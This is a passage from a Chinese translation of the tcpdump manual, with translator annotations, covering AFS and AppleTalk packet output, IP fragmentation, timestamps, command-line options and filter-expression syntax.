如-vv), tcpdump 会打印出确认包(nt: 可理解为, 与应答包有区别的包)以及附加头部信息(nt: 可理解为, 所有包, 而不仅仅是确认包的附加头部信息), 比如, RX call ID(请求包中'请求调用'的ID),call number('请求调用'的编号), sequence number(nt: 包顺序号),serial number(nt | rt: 可理解为与包中数据相关的另一个顺信号, 具体含义需补充), 请求包的标识. (nt: 接下来一段为重复描述,\n所以略去了), 此外确认包中的MTU协商信息也会被打印出来(nt: 确认包为相对于请求包的确认包, Maximum Transmission Unit, 最大传输单元).\n\n如果 -v 选项被重复了三次(nt: 如-vvv), 那么AFS应用类型数据包的'安全索引'('security index')以及'服务索引'('service id')将会被打印.\n\n对于表示异常的数据包(nt: abort packet, 可理解为, 此包就是用来通知接受者某种异常已发生), tcpdump 会打印出错误号(error codes).\n\n但对于Ubik beacon packets(nt: Ubik 灯塔指示包, Ubik可理解为特殊的通信协议, beacon packets, 灯塔数据包, 可理解为指明通信中关键信息的一些数据包), 错误号不会被打印, 因为对于Ubik 协议, 异常数据包不是表示错误, 相反却是表示一种肯定应答(nt: 即, yes vote).\n\nAFS 请求数据量大, 参数也多, 所以要求tcpdump的 snaplen 比较大, 一般可通过启动tcpdump时设置选项'-s 256' 来增大snaplen, 以监测AFS 应用通信负载.\n\nAFS 回应包并不显示标识RPC 属于何种远程调用. 从而, tcpdump 会跟踪最近一段时间内的请求包, 并通过call number(调用编号), service ID(服务索引) 来匹配收到的回应包. 如果回应包不是针对最近一段时间内的请求包, tcpdump将无法解析该包.\n\n## KIP AppleTalk协议\n\n(nt | rt: DDP in UDP可理解为, DDP, The AppleTalk Data Delivery Protocol,\n相当于支持KIP AppleTalk协议栈的网络层协议, 而DDP 本身又是通过UDP来传输的,\n即在UDP 上实现的用于其他网络的网络层，KIP AppleTalk是苹果公司开发的整套网络协议栈).\n\nAppleTalk DDP 数据包被封装在UDP数据包中, 其解封装(nt: 相当于解码)和相应信息的转储也遵循DDP 包规则.(nt:encapsulate, 封装, 相当于编码, de-encapsulate, 解封装, 相当于解码, dump, 转储, 通常就是指对其信息进行打印).\n\n/etc/atalk.names 文件中包含了AppleTalk 网络和节点的数字标识到名称的对应关系. 其文件格式通常如下所示:\n```\nnumber name\n\n1.254 ether\n16.1 icsd-net\n1.254.110 ace\n```\n\n头两行表示有两个AppleTalk 网络. 第三行给出了特定网络上的主机(一个主机会用3个字节来标识,而一个网络的标识通常只有两个字节, 这也是两者标识的主要区别)(nt: 1.254.110 可理解为ether网络上的ace主机).\n\n标识与其对应的名字之间必须要用空白分开. 除了以上内容, /etc/atalk.names中还包含空行以及注释行(以'#'开始的行).\n\nAppleTalk 完整网络地址将以如下格式显示:\n```\nnet.host.port\n```\n\n以下为一段具体显示:\n```\n144.1.209.2 > icsd-net.112.220\noffice.2 > icsd-net.112.220\njssmag.149.235 > icsd-net.2\n```\n\n(如果/etc/atalk.names 文件不存在, 或者没有相应AppleTalk 主机/网络的条目, 数据包的网络地址将以数字形式显示).\n\n在第一行中, 网络144.1上的节点209通过2端口,向网络icsd-net上监听在220端口的112节点发送了一个NBP应用数据包(nt | rt: NBP, name binding protocol, 名称绑定协议, 从数据来看, NBP服务器会在端口2提供此服务.'DDP port 2' 可理解为'DDP 对应传输层的端口2', DDP本身没有端口的概念, 这点未确定, 需补充).\n\n第二行与第一行类似, 只是源的全部地址可用'office'进行标识.\n\n第三行表示: jssmag网络上的149节点通过235向icsd-net网络上的所有节点的2端口(NBP端口)发送了数据包.(需要注意的是,在AppleTalk 网络中如果地址中没有节点, 则表示广播地址, 从而节点标识和网络标识最好在/etc/atalk.names有所区别.nt: 否则一个标识x.port 无法确定x是指一个网络上所有主机的port口还是指定主机x的port口).\n\ntcpdump 可解析NBP (名称绑定协议) and ATP (AppleTalk传输协议)数据包, 对于其他应用层的协议, 只会打印出相应协议名字(如果此协议没有注册一个通用名字, 只会打印其协议号)以及数据包的大小.\n\nNBP 数据包会按照如下格式显示:\n```\nicsd-net.112.220 > jssmag.2: nbp-lkup 190: \"=:LaserWriter@*\"\njssmag.209.2 > icsd-net.112.220: nbp-reply 190: \"RM1140:LaserWriter@*\" 250\ntechpit.2 > icsd-net.112.220: nbp-reply 190: \"techpit:LaserWriter@*\" 186\n```\n\n第一行表示: 网络icsd-net 中的节点112 通过220端口向网络jssmag 中所有节点的端口2发送了对'LaserWriter'的名称查询请求(nt:此处名称可理解为一个资源的名称, 比如打印机). 此查询请求的序列号为190.\n\n第二行表示: 网络jssmag 中的节点209 通过2端口向icsd-net.112节点的端口220进行了回应: 我有'LaserWriter'资源, 其资源名称为'RM1140', 并且在端口250上提供改资源的服务. 此回应的序列号为190, 对应之前查询的序列号.\n\n第三行也是对第一行请求的回应: 节点techpit 通过2端口向icsd-net.112节点的端口220进行了回应:我有'LaserWriter'资源, 其资源名称为'techpit', 并且在端口186上提供改资源的服务. 此回应的序列号为190, 对应之前查询的序列号.\n\nATP 数据包的显示格式如下:\n```\njssmag.209.165 > helios.132: atp-req 12266<0-7> 0xae030001\nhelios.132 > jssmag.209.165: atp-resp 12266:0 (512) 0xae040000\nhelios.132 > jssmag.209.165: atp-resp 12266:1 (512) 0xae040000\nhelios.132 > jssmag.209.165: atp-resp 12266:2 (512) 0xae040000\nhelios.132 > jssmag.209.165: atp-resp 12266:3 (512) 0xae040000\nhelios.132 > jssmag.209.165: atp-resp 12266:5 (512) 0xae040000\nhelios.132 > jssmag.209.165: atp-resp 12266:6 (512) 0xae040000\nhelios.132 > jssmag.209.165: atp-resp*12266:7 (512) 0xae040000\njssmag.209.165 > helios.132: atp-req 12266<3,5> 0xae030001\nhelios.132 > jssmag.209.165: atp-resp 12266:3 (512) 0xae040000\nhelios.132 > jssmag.209.165: atp-resp 12266:5 (512) 0xae040000\njssmag.209.165 > helios.132: atp-rel 12266<0-7> 0xae030001\njssmag.209.133 > helios.132: atp-req* 12267<0-7> 0xae030002\n```\n\n第一行表示节点 Jssmag.209 向节点helios 发送了一个会话编号为12266的请求包, 请求helios回应8个数据包(这8个数据包的顺序号为0-7(nt: 顺序号与会话编号不同, 后者为一次完整传输的编号,前者为该传输中每个数据包的编号. transaction, 会话, 通常也被叫做传输)). 行尾的16进制数字表示该请求包中'userdata'域的值(nt: 从下文来看, 这并没有把所有用户数据都打印出来 ).\n\nHelios 回应了8个512字节的数据包. 跟在会话编号(nt: 12266)后的数字表示该数据包在该会话中的顺序号.括号中的数字表示该数据包中数据的大小, 这不包括atp 的头部. 在顺序号为7数据包(第8行)外带了一个'*'号,表示该数据包的EOM 标志被设置了.(nt: EOM, End Of Media, 可理解为, 表示一次会话的数据回应完毕).\n\n接下来的第9行表示, Jssmag.209 又向helios 提出了请求: 顺序号为3以及5的数据包请重新传送. Helios 收到这个请求后重新发送了这个两个数据包, jssmag.209 再次收到这两个数据包之后, 主动结束(release)了此会话.\n\n在最后一行, jssmag.209 向helios 发送了开始下一次会话的请求包. 请求包中的'*'表示该包的XO 标志没有被设置.\n\n(nt: XO, exactly once, 可理解为在该会话中, 数据包在接受方只被精确地处理一次, 就算对方重复传送了该数据包,接收方也只会处理一次, 这需要用到特别设计的数据包接收和处理机制).\n\n# IP 数据包破碎\n\n(nt: 指把一个IP数据包分成多个IP数据包)\n\n碎片IP数据包(nt: 即一个大的IP数据包破碎后生成的小IP数据包)有如下两种显示格式.\n```\n(frag id:size@offset+)\n(frag id:size@offset)\n```\n(第一种格式表示, 此碎片之后还有后续碎片. 第二种格式表示, 此碎片为最后一个碎片.)\n\nid 表示破碎编号(nt: 从下文来看, 会为每个要破碎的大IP包分配一个破碎编号, 以便区分每个小碎片是否由同一数据包破碎而来).\n\nsize 表示此碎片的大小 , 不包含碎片头部数据. offset表示此碎片所含数据在原始整个IP包中的偏移((nt: 从下文来看,一个IP数据包是作为一个整体被破碎的, 包括头和数据, 而不只是数据被分割).\n\n每个碎片都会使tcpdump产生相应的输出打印. 第一个碎片包含了高层协议的头数据(nt:从下文来看, 被破碎IP数据包中相应tcp头以及IP头都放在了第一个碎片中 ), 从而tcpdump会针对第一个碎片显示这些信息, 并接着显示此碎片本身的信息. 其后的一些碎片并不包含高层协议头信息, 从而只会在显示源和目的之后显示碎片本身的信息. 以下有一个例子: 这是一个从arizona.edu 到lbl-rtsg.arpa途经CSNET网络(nt: CSNET connection 可理解为建立在CSNET 网络上的连接)的ftp应用通信片段:\n```\narizona.ftp-data > rtsg.1170: . 1024:1332(308) ack 1 win 4096 (frag 595a:328@0+)\narizona > rtsg: (frag 595a:204@328)\nrtsg.1170 > arizona.ftp-data: . ack 1536 win 2560\n```\n\n有几点值得注意:\n\n第一, 第二行的打印中, 地址后面没有端口号.\n\n这是因为TCP协议信息都放到了第一个碎片中, 当显示第二个碎片时, 我们无法知道此碎片所对应TCP包的顺序号.\n\n第二, 从第一行的信息中, 可以发现arizona需要向rtsg发送308字节的用户数据, 而事实是, 相应IP包经破碎后会总共产生512字节数据(第一个碎片包含308字节的数据, 第二个碎片包含204个字节的数据, 这超过了308字节). 如果你在查找数据包的顺序号空间中的\n一些空洞(nt: hole,空洞, 指数据包之间的顺序号没有上下衔接上), 512这个数据就足够使你迷茫一阵(nt: 其实只要关注308就行,不必关注破碎后的数据总量).\n\n一个数据包(nt | rt: 指IP数据包)如果带有非IP破碎标志, 则显示时会在最后显示'(DF)'.(nt: 意味着此IP包没有被破碎过).\n\n# 时间戳\n\ntcpdump的所有输出打印行中都会默认包含时间戳信息.\n\n时间戳信息的显示格式如下\n```\nhh:mm:ss.frac　(nt: 小时:分钟:秒.(nt: frac未知, 需补充))\n```\n此时间戳的精度与内核时间精度一致,　反映的是内核第一次看到对应数据包的时间(nt: saw, 即可对该数据包进行操作).　而数据包从物理线路传递到内核的时间, 以及内核花费在此包上的中断处理时间都没有算进来.\n\n# 命令使用\n\ntcpdump采用命令行方式，它的命令格式为：\n```sh\ntcpdump [ -AdDeflLnNOpqRStuUvxX ] [ -c count ]\n           [ -C file_size ] [ -F file ]\n           [ -i interface ] [ -m module ] [ -M secret ]\n           [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]\n           [ -W filecount ]\n           [ -E spi@ipaddr algo:secret,...  ]\n           [ -y datalinktype ] [ -Z user ]\n           [ expression ]\n```\n\n## tcpdump的简单选项介绍\n\n```\n-A  以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含网页数据的数据包时, 可方便查看数据(nt: 即Handy for capturing web pages).\n\n-c  count\n    tcpdump将在接受到count个数据包后退出.\n\n-C  file-size (nt: 此选项用于配合-w file 选项使用)\n    该选项使得tcpdump 在把原始数据包直接保存到文件中之前, 检查此文件大小是否超过file-size. 如果超过了, 将关闭此文件,另创一个文件继续用于原始数据包的记录. 新创建的文件名与-w 选项指定的文件名一致, 但文件名后多了一个数字.该数字会从1开始随着新创建文件的增多而增加. file-size的单位是百万字节(nt: 这里指1,000,000个字节,并非1,048,576个字节, 后者是以1024字节为1k, 1024k字节为1M计算所得, 即1M=1024 ＊ 1024 ＝ 1,048,576)\n\n-d  以容易阅读的形式,在标准输出上打印出编排过的包匹配码, 随后tcpdump停止.(nt | rt: human readable, 容易阅读的,通常是指以ascii码来打印一些信息. compiled, 编排过的. packet-matching code, 包匹配码,含义未知, 需补充)\n\n-dd 以C语言的形式打印出包匹配码.\n\n-ddd 以十进制数的形式打印出包匹配码(会在包匹配码之前有一个附加的'count'前缀).\n\n-D  打印系统中所有tcpdump可以在其上进行抓包的网络接口. 每一个接口会打印出数字编号, 相应的接口名字, 以及可能的一个网络接口描述. 其中网络接口名字和数字编号可以用在tcpdump 的-i flag 选项(nt: 把名字或数字代替flag), 来指定要在其上抓包的网络接口.\n\n    此选项在不支持接口列表命令的系统上很有用(nt: 比如, Windows 系统, 或缺乏 ifconfig -a 的UNIX系统); 接口的数字编号在windows 2000 或其后的系统中很有用, 因为这些系统上的接口名字比较复杂, 而不易使用.\n\n    如果tcpdump编译时所依赖的libpcap库太老,-D 选项不会被支持, 因为其中缺乏 pcap_findalldevs()函数.\n\n-e  每行的打印输出中将包括数据包的数据链路层头部信息\n\n-E  spi@ipaddr algo:secret,...\n\n    可通过spi@ipaddr algo:secret 来解密IPsec ESP包(nt | rt:IPsec Encapsulating Security Payload,IPsec 封装安全负载, IPsec可理解为, 一整套对ip数据包的加密协议, ESP 为整个IP 数据包或其中上层协议部分被加密后的数据,前者的工作模式称为隧道模式; 后者的工作模式称为传输模式 . 工作原理, 另需补充).\n\n    需要注意的是, 在终端启动tcpdump 时, 可以为IPv4 ESP packets 设置密钥(secret）.\n\n    可用于加密的算法包括des-cbc, 3des-cbc, blowfish-cbc, rc3-cbc, cast128-cbc, 或者没有(none).默认的是des-cbc(nt: des, Data Encryption Standard, 数据加密标准, 加密算法未知, 另需补充).secret 为用于ESP 的密钥, 使用ASCII 字符串方式表达. 如果以 0x 开头, 该密钥将以16进制方式读入.\n\n    该选项中ESP 的定义遵循RFC2406, 而不是 RFC1827. 并且, 此选项只是用来调试的, 不推荐以真实密钥(secret)来使用该选项, 因为这样不安全: 在命令行中输入的secret 可以被其他人通过ps 等命令查看到.\n\n    除了以上的语法格式(nt: 指spi@ipaddr algo:secret), 还可以在后面添加一个语法输入文件名字供tcpdump 使用(nt：即把spi@ipaddr algo:secret,... 中...换成一个语法文件名). 此文件在接受到第一个ESP　包时会打开此文件, 所以最好此时把赋予tcpdump 的一些特权取消(nt: 可理解为, 这样防范之后, 当该文件为恶意编写时,不至于造成过大损害).\n\n-f  显示外部的IPv4 地址时(nt: foreign IPv4 addresses, 可理解为, 非本机ip地址), 采用数字方式而不是名字.(此选项是用来对付Sun公司的NIS服务器的缺陷(nt: NIS, 网络信息服务, tcpdump 显示外部地址的名字时会用到她提供的名称服务): 此NIS服务器在查询非本地地址名字时,常常会陷入无尽的查询循环).\n\n    由于对外部(foreign)IPv4地址的测试需要用到本地网络接口(nt: tcpdump 抓包时用到的接口)及其IPv4 地址和网络掩码. 如果此地址或网络掩码不可用, 或者此接口根本就没有设置相应网络地址和网络掩码(nt: linux 下的 'any' 网络接口就不需要设置地址和掩码, 不过此'any'接口可以收到系统中所有接口的数据包), 该选项不能正常工作.\n\n-F  file\n    使用file 文件作为过滤条件表达式的输入, 此时命令行上的输入将被忽略.\n\n-i  interface\n\n    指定tcpdump 需要监听的接口.  如果没有指定, tcpdump 会从系统接口列表中搜寻编号最小的已配置好的接口(不包括 loopback 接口).一但找到第一个符合条件的接口, 搜寻马上结束.\n\n    在采用2.2版本或之后版本内核的Linux 操作系统上, 'any' 这个虚拟网络接口可被用来接收所有网络接口上的数据包(nt: 这会包括目的是该网络接口的, 也包括目的不是该网络接口的). 需要注意的是如果真实网络接口不能工作在'混杂'模式(promiscuous)下,则无法在'any'这个虚拟的网络接口上抓取其数据包.\n\n    如果 -D 标志被指定, tcpdump会打印系统中的接口编号，而该编号就可用于此处的interface 参数.\n\n-l  对标准输出进行行缓冲(nt: 使标准输出设备遇到一个换行符就马上把这行的内容打印出来).在需要同时观察抓包打印以及保存抓包记录的时候很有用. 比如, 可通过以下命令组合来达到此目的:\n    ``tcpdump  -l  |  tee dat'' 或者 ``tcpdump  -l   > dat  &  tail  -f  dat''.(nt: 前者使用tee来把tcpdump 的输出同时放到文件dat和标准输出中, 而后者通过重定向操作'>', 把tcpdump的输出放到dat 文件中, 同时通过tail把dat文件中的内容放到标准输出中)\n\n-L  列出指定网络接口所支持的数据链路层的类型后退出.(nt: 指定接口通过-i 来指定)\n\n-m  module\n    通过module 指定的file 装载SMI MIB 模块(nt: SMI，Structure of Management Information, 管理信息结构MIB, Management Information Base, 管理信息库. 可理解为, 这两者用于SNMP(Simple Network Management Protoco)协议数据包的抓取. 具体SNMP 的工作原理未知, 另需补充).\n\n    此选项可多次使用, 从而为tcpdump 装载不同的MIB 模块.\n\n-M  secret  如果TCP 数据包(TCP segments)有TCP-MD5选项(在RFC 2385有相关描述), 则为其摘要的验证指定一个公共的密钥secret.\n\n-n  不对地址(比如, 主机地址, 端口号)进行数字表示到名字表示的转换.\n\n-N  不打印出host 的域名部分. 比如, 如果设置了此选现, tcpdump 将会打印'nic' 而不是 'nic.ddn.mil'.\n\n-O  不启用进行包匹配时所用的优化代码. 当怀疑某些bug是由优化代码引起的, 此选项将很有用.\n\n-p  一般情况下, 把网络接口设置为非'混杂'模式. 但必须注意 , 在特殊情况下此网络接口还是会以'混杂'模式来工作； 从而, '-p' 的设与不设, 不能当做以下选现的代名词:'ether host {local-hw-add}' 或  'ether broadcast'(nt: 前者表示只匹配以太网地址为host 的包, 后者表示匹配以太网地址为广播地址的数据包).\n\n-q  快速(也许用'安静'更好?)打印输出. 即打印很少的协议相关信息, 从而输出行都比较简短.\n\n-R  设定tcpdump 对 ESP/AH 数据包的解析按照 RFC1825而不是RFC1829(nt: AH, 认证头, ESP， 安全负载封装, 这两者会用在IP包的安全传输机制中). 如果此选项被设置, tcpdump 将不会打印出'禁止中继'域(nt: relay prevention field). 另外,由于ESP/AH规范中没有规定ESP/AH数据包必须拥有协议版本号域,所以tcpdump不能从收到的ESP/AH数据包中推导出协议版本号.\n\n-r  file\n    从文件file 中读取包数据. 如果file 字段为 '-' 符号, 则tcpdump 会从标准输入中读取包数据.\n\n-S  打印TCP 数据包的顺序号时, 使用绝对的顺序号, 而不是相对的顺序号.(nt: 相对顺序号可理解为, 相对第一个TCP 包顺序号的差距,比如, 接受方收到第一个数据包的绝对顺序号为232323, 对于后来接收到的第2个,第3个数据包, tcpdump会打印其序列号为1, 2分别表示与第一个数据包的差距为1 和 2. 而如果此时-S 选项被设置, 对于后来接收到的第2个, 第3个数据包会打印出其绝对顺序号:232324, 232325).\n\n-s  snaplen\n    设置tcpdump的数据包抓取长度为snaplen, 如果不设置默认将会是68字节(而支持网络接口分接头(nt: NIT, 上文已有描述,可搜索'网络接口分接头'关键字找到那里)的SunOS系列操作系统中默认的也是最小值是96).68字节对于IP, ICMP(nt: Internet Control Message Protocol,因特网控制报文协议), TCP 以及 UDP 协议的报文已足够, 但对于名称服务(nt: 可理解为dns, nis等服务), NFS服务相关的数据包会产生包截短. 如果产生包截短这种情况, tcpdump的相应打印输出行中会出现''[|proto]''的标志（proto 实际会显示为被截短的数据包的相关协议层次). 需要注意的是, 采用长的抓取长度(nt: snaplen比较大), 会增加包的处理时间, 并且会减少tcpdump 可缓存的数据包的数量， 从而会导致数据包的丢失. 所以, 在能抓取我们想要的包的前提下, 抓取长度越小越好.把snaplen 设置为0 意味着让tcpdump自动选择合适的长度来抓取数据包.\n\n-T  type\n    强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包.  目前已知的type 可取的协议为:\n    aodv (Ad-hoc On-demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用),\n    cnfp (Cisco  NetFlow  protocol),  rpc(Remote Procedure Call), rtp (Real-Time Applications protocol),\n    rtcp (Real-Time Applications con-trol protocol), snmp (Simple Network Management Protocol),\n    tftp (Trivial File Transfer Protocol, 碎文件协议), vat (Visual Audio Tool, 可用于在internet 上进行电\n    视电话会议的应用层协议), 以及wb (distributed White Board, 可用于网络会议的应用层协议).\n\n-t     在每行输出中不打印时间戳\n\n-tt    不对每行输出的时间进行格式处理(nt: 这种格式一眼可能看不出其含义, 如时间戳打印成1261798315)\n\n-ttt   tcpdump 输出时, 每两行打印之间会延迟一个段时间(以毫秒为单位)\n\n-tttt  在每行打印的时间戳之前添加日期的打印\n\n-u     打印出未加密的NFS 句柄(nt: handle可理解为NFS 中使用的文件句柄, 这将包括文件夹和文件夹中的文件)\n\n-U    使得当tcpdump在使用-w 选项时, 其文件写入与包的保存同步.(nt: 即, 当每个数据包被保存时, 它将及时被写入文件中,而不是等文件的输出缓冲已满时才真正写入此文件)\n\n      -U 标志在老版本的libcap库(nt: tcpdump 所依赖的报文捕获库)上不起作用, 因为其中缺乏pcap_cump_flush()函数.\n\n-v    当分析和打印的时候, 产生详细的输出. 比如, 包的生存时间, 标识, 总长度以及IP包的一些选项. 这也会打开一些附加的包完整性检测, 比如对IP或ICMP包头部的校验和.\n\n-vv   产生比-v更详细的输出. 比如, NFS回应包中的附加域将会被打印, SMB数据包也会被完全解码.\n\n-vvv  产生比-vv更详细的输出. 比如, telent 时所使用的SB, SE 选项将会被打印, 如果telnet同时使用的是图形界面,\n      其相应的图形选项将会以16进制的方式打印出来(nt: telnet 的SB,SE选项含义未知, 另需补充).\n\n-w    把包数据直接写入文件而不进行分析和打印输出. 这些包数据可在随后通过-r 选项来重新读入并进行分析和打印.\n\n-W    filecount\n      此选项与-C 选项配合使用, 这将限制可打开的文件数目, 并且当文件数据超过这里设置的限制时, 依次循环替代之前的文件, 这相当于一个拥有filecount 个文件的文件缓冲池. 同时, 该选项会使得每个文件名的开头会出现足够多并用来占位的0, 这可以方便这些文件被正确的排序.\n\n-x    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制打印出每个包的数据(但不包括连接层的头部).总共打印的数据大小不会超过整个数据包的大小与snaplen 中的最小值. 必须要注意的是, 如果高层协议数据没有snaplen 这么长,并且数据链路层(比如, Ethernet层)有填充数据, 则这些填充数据也会被打印.(nt: so for link  layers  that pad, 未能衔接理解和翻译, 需补充 )\n\n-xx   tcpdump 会打印每个包的头部数据, 同时会以16进制打印出每个包的数据, 其中包括数据链路层的头部.\n\n-X    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制和ASCII码形式打印出每个包的数据(但不包括连接层的头部).这对于分析一些新协议的数据包很方便.\n\n-XX   当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以16进制和ASCII码形式打印出每个包的数据, 其中包括数据链路层的头部.这对于分析一些新协议的数据包很方便.\n\n-y    datalinktype\n      设置tcpdump 只捕获数据链路层协议类型是datalinktype的数据包\n\n-Z    user\n      使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的用户ID设置为user, 组ID设置为user首要所属组的ID(nt: tcpdump 此处可理解为tcpdump 运行之后对应的进程)\n\n      此选项也可在编译的时候被设置为默认打开.(nt: 此时user 的取值未知, 需补充)\n```\n\n## tcpdump条件表达式\n\n该表达式用于决定哪些数据包将被打印. 如果不给定条件表达式, 网络上所有被捕获的包都会被打印,否则, 只有满足条件表达式的数据包被打印.(nt: all packets, 可理解为, 所有被指定接口捕获的数据包).\n\n  表达式由一个或多个'表达元'组成(nt: primitive, 表达元, 可理解为组成表达式的基本元素). 一个表达元通常由一个或多个修饰符(qualifiers)后跟一个名字或数字表示的id组成(nt: 即, 'qualifiers id').有三种不同类型的修饰符:type, dir以及 proto.\n  \n```\ntype 修饰符指定id 所代表的对象类型, id可以是名字也可以是数字. 可选的对象类型有: host, net, port 以及portrange(nt: host 表明id表示主机, net 表明id是网络, port 表明id是端而portrange 表明id 是一个端口范围).  如, 'host foo', 'net 128.3', 'port 20', 'portrange 6000-6008'(nt: 分别表示主机 foo,网络 128.3, 端口 20, 端口范围 6000-6008). 如果不指定type 修饰符, id默认的修饰符为host.\n\ndir 修饰符描述id 所对应的传输方向, 即发往id 还是从id 接收（nt: 而id 到底指什么需要看其前面的type 修饰符）.可取的方向为: src, dst, src 或 dst, src并且dst.(nt:分别表示, id是传输源, id是传输目的, id是传输源或者传输目的, id是传输源并且是传输目的). 例如, 'src foo','dst net 128.3', 'src or dst port ftp-data'.(nt: 分别表示符合条件的数据包中, 源主机是foo, 目的网络是128.3, 源或目的端口为 ftp-data).如果不指定dir修饰符, id 默认的修饰符为src 或 dst.对于链路层的协议,比如SLIP(nt: Serial Line InternetProtocol, 串联线路网际网络协议), 以及linux下指定'any' 设备, 并指定'cooked'(nt | rt: cooked 含义未知, 需补充) 抓取类型, 或其他设备类型,可以用'inbound' 和 'outbount' 修饰符来指定想要的传输方向.\n\nproto 修饰符描述id 所属的协议. 可选的协议有: ether, fddi, tr, wlan, ip, ip6, arp, rarp, decnet, tcp以及 upd.(nt | rt: ether, fddi, tr, 具体含义未知, 需补充. 可理解为物理以太网传输协议, 光纤分布数据网传输协议,以及用于路由跟踪的协议.  wlan, 无线局域网协议; ip,ip6 即通常的TCP/IP协议栈中所使用的ipv4以及ipv6网络层协议;arp, rarp 即地址解析协议,反向地址解析协议; decnet, Digital Equipment Corporation开发的, 最早用于PDP-11 机器互联的网络协议; tcp and udp, 即通常TCP/IP协议栈中的两个传输层协议).\n\n例如, 'ether src foo', `arp net 128.3', 'tcp port 21', 'udp portrange 7000-7009' 分别表示 '从以太网地址foo 来的数据包','发往或来自128.3网络的arp协议数据包', '发送或接收端口为21的tcp协议数据包', '发送或接收端口范围为7000-7009的udp协议数据包'.\n\n如果不指定proto 修饰符, 则默认为与相应type匹配的修饰符. 例如, 'src foo' 含义是 '(ip or arp or rarp) src foo' (nt: 即, 来自主机foo的ip/arp/rarp协议数据包, 默认type为host),`net bar' 含义是`(ip  or  arp  or rarp) net bar'(nt: 即, 来自或发往bar网络的ip/arp/rarp协议数据包),`port 53' 含义是 `(tcp or udp) port 53'(nt: 即, 发送或接收端口为53的tcp/udp协议数据包).(nt: 由于tcpdump 直接通过数据链路层的 BSD 数据包过滤器或 DLPI(datalink provider interface, 数据链层提供者接口)来直接获得网络数据包, 其可抓取的数据包可涵盖上层的各种协议, 包括arp, rarp, icmp(因特网控制报文协议),ip, ip6, tcp, udp, sctp(流控制传输协议).\n\n对于修饰符后跟id 的格式,可理解为, type id 是对包最基本的过滤条件: 即对包相关的主机, 网络, 端口的限制;dir 表示对包的传送方向的限制; proto表示对包相关的协议限制)\n\n'fddi'(nt: Fiber Distributed Data Interface) 实际上与'ether' 含义一样: tcpdump 会把他们当作一种''指定网络接口上的数据链路层协议''. 如同ehter网(以太网), FDDI 的头部通常也会有源, 目的, 以及包类型, 从而可以像ether网数据包一样对这些域进行过滤. 此外, FDDI 头部还有其他的域, 但不能被放到表达式中用来过滤\n\n同样, 'tr' 和 'wlan' 也和 'ether' 含义一致, 上一段对fddi 的描述同样适用于tr(Token Ring) 和wlan(802.11 wireless LAN)的头部. 对于802.11 协议数据包的头部, 目的域称为DA, 源域称为 SA;而其中的 BSSID, RA, TA 域(nt | rt: 具体含义需补充)不会被检测(nt: 不能被用于包过虑表达式中).\n```\n\n除以上所描述的表达元('primitive')， 还有其他形式的表达元, 并且与上述表达元格式不同. 比如: gateway, broadcast, less, greater以及算术表达式(nt: 其中每一个都算一种新的表达元). 下面将会对这些表达元进行说明.\n\n表达元之间还可以通过关键字and, or 以及 not 进行连接, 从而可组成比较复杂的条件表达式. 比如,`host foo and not port ftp and not port ftp-data'(nt: 其过滤条件可理解为, 数据包的主机为foo,并且端口不是ftp(端口21) 和ftp-data(端口20, 常用端口和名字的对应可在linux 系统中的/etc/service 文件中找到)).\n\n为了表示方便, 同样的修饰符可以被省略, 如'tcp dst port ftp or ftp-data or domain' 与以下的表达式含义相同'tcp dst port ftp or tcp dst port ftp-data or tcp dst port domain'.(nt: 其过滤条件可理解为,包的协议为tcp, 目的端口为ftp 或 ftp-data 或 domain(端口53) ).\n\n借助括号以及相应操作符,可把表达元组合在一起使用(由于括号是shell的特殊字符, 所以在shell脚本或终端中使用时必须对括号进行转义, 即'(' 与')'需要分别表达成'\\(' 与 '\\)').\n\n有效的操作符有:\n```\n 否定操作 (`!' 或 `not')\n 与操作(`&&' 或 `and')\n 或操作(`||' 或 `or')\n```\n\n  否定操作符的优先级别最高. 与操作和或操作优先级别相同, 并且二者的结合顺序是从左到右. 要注意的是, 表达'与操作'时,需要显式写出'and'操作符, 而不只是把前后表达元并列放置(nt: 二者中间的'and' 操作符不可省略).\n\n如果一个标识符前没有关键字, 则表达式的解析过程中最近用过的关键字(往往也是从左往右距离标识符最近的关键字)将被使用.比如,\n```\nnot host vs and ace\n```\n  是以下表达的精简:\n```\nnot host vs and host ace\n```\n\n而不是not (host vs or ace).(nt: 前两者表示, 所需数据包不是来自或发往host vs, 而是来自或发往ace.而后者表示数据包只要不是来自或发往vs或ac都符合要求)\n\n  整个条件表达式可以被当作一个单独的字符串参数也可以被当作空格分割的多个参数传入tcpdump, 后者更方便些. 通常, 如果表达式中包含元字符(nt: 如正则表达式中的'*', '.'以及shell中的'('等字符)， 最好还是使用单独字符串的方式传入. 这时,整个表达式需要被单引号括起来. 多参数的传入方式中, 所有参数最终还是被空格串联在一起, 作为一个字符串被解析.\n\n# 附录:tcpdump的表达元\n\n(nt: True 在以下的描述中含义为: 相应条件表达式中只含有以下所列的一个特定表达元, 此时表达式为真, 即条件得到满足)\n\n## dst host host\n\n如果IPv4/v6 数据包的目的域是host, 则与此对应的条件表达式为真.host 可以是一个ip地址, 也可以是一个主机名.\n## src host host\n\n如果IPv4/v6 数据包的源域是host, 则与此对应的条件表达式为真.\nhost 可以是一个ip地址, 也可以是一个主机名.\nhost host\n\n如果IPv4/v6数据包的源或目的地址是 host, 则与此对应的条件表达式为真.以上的几个host 表达式之前可以添加以下关键字:ip, arp, rarp, 以及 ip6.比如:\nip host host\n也可以表达为:\nether proto \\ip and host host(nt: 这种表达方式在下面有说明, 其中ip之前需要有\\来转义,因为ip 对tcpdump 来说已经是一个关键字了.)\n\n如果host 是一个拥有多个IP 的主机, 那么任何一个地址都会用于包的匹配(nt: 即发向host 的数据包的目的地址可以是这几个IP中的任何一个, 从host 接收的数据包的源地址也可以是这几个IP中的任何一个).\n\n## ether dst ehost\n\n如果数据包(nt: 指tcpdump 可抓取的数据包, 包括ip 数据包, tcp数据包)的以太网目标地址是ehost,则与此对应的条件表达式为真. Ehost 可以是/etc/ethers 文件中的名字或一个数字地址(nt: 可通过 man ethers 看到对/etc/ethers 文件的描述, 样例中用的是数字地址)\n\n## ether src 